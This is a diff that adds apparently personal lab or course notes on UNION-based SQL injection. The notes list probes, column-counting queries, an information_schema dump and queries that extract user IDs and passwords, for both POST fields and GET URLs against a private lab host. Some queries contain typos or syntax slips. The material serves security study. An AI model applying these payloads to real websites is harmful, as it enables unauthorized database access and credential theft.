@@ -202,7 +202,7 @@ selecet table_schema from information_schema.columns ;
 select table_name from information_schema.columns ;
 select column_name from information_schema.columns ;
 select table_schema,table_name,column_name from information_schema.columns
-
+select name,cost,year from session.car ; (first exmaple of info dumping)
 
 
 
@@ -212,17 +212,22 @@ table_schema=all databases names accross server
 table_name=all tables accross all databses accross server
 column_name=all columns accross all tables accross all databases accross server
 ```
-
-
-
-
-
-
-
-
-
-
-
+# SQL injection
+#   Post method
+interact with page then.  First identify vuln field with (' or 1='1) make sure to attempt with all options if necessary.  Second id the # of columns (dont just assume the visible columns are the end all) 
+Audi' UNION SELECT 1,2,3,4,5 # (you see columns numbered 1345(notice number 2 was skipped))
+from previous command 5 columns were identifies
+per demo this golden statement was created to data dump data base after the previous to steps were completed (id vuln and id # of columns this modified golden statement is the third step)
+Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+Step 4 Craft queries (# is used to comment out anything that may precede query)(2 is a placeholder bc in previous steps it was discovered the 2nd column doesnt appear and this database wants 5 arguments)
+UNION SELECT tireid,2,name,size,cost FROM session.Tires #
+UNION SELECT user_id,2,remote_ip,status,5 session.session_log #
+UNION SELECT cost,2,size,name,5 session.Tires #
+#   Get method
+interact with page.  First id vuln field (interact with url bar)(http://10.50.33.78/uniondemo.php?Selection=4&Submit=Submit turns into http://10.50.33.78/uniondemo.php?Selection=4 (OR 1=1))
+identify number of columns (UNION SELECT 1,2,3(start with the same number of visible columns and increment if or as needed))
+modify golden statement (http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT table_schema,column_name,table_name%20from%20information_schema.columns))
+craft query(http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT id,pass,name from session.user))
 
 
 
